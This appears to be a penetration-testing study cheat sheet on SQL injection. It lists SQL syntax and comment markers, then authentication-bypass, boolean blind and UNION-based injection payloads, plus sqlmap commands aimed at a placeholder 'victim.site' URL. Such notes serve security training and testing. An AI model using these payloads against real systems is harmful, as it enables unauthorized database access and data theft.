## SQLi ##

# Syntax
SELECT <columns list> FROM <table> WHERE <condition>;
<select statement> UNION <other select statement>;

# Comments
# (the hash symbol)
-- (two dashes followed by a space!)

# Finding SQL Injections
string terminator:  ' and "
SQL commands: SELECT, UNION, e.t.c
SQL comments: # or -- 

## Cheatsheet ##

' OR '1'='1
' OR 'a'='a
' OR substr(user(), 1, 1)= 'a       // check if current user's name starts from a
' OR substr(user(), 1, 1)= 'b
....
' OR substr(user(), 2, 1)= 'a       // check if current user's name has 'a' in the second place
' OR substr(user(), 2, 1)= 'b
....
' UNION SELECT user(); -- -
# Finding the number of fields of the original query
' UNION SELECT null; -- -
' UNION SELECT null, null; -- -       // assuming it has only 2 fields, when we try with 3 fields we will get an error message
....
# Test which fields are part of the output page
' UNION SELECT 'test1', 'test2'; -- -     // and check which one is displayed at the page (take a look at the source code of the page as well)
# Let's say the first field is part of the output page, now it's time to exploit the injection
' UNION SELECT user(), 'test2'; -- -

## SQLMap ##

# Syntax
sqlmap -u <URL> -p <injection parameter> [options]
sqlmap -u 'http://victim.site/view.php?id=113' -p id --technique=U      // use a UNION based SQLi technique

# Exploit a POST parameter
sqlmap -u <URL> --data=<POST string> -p parameter [options]

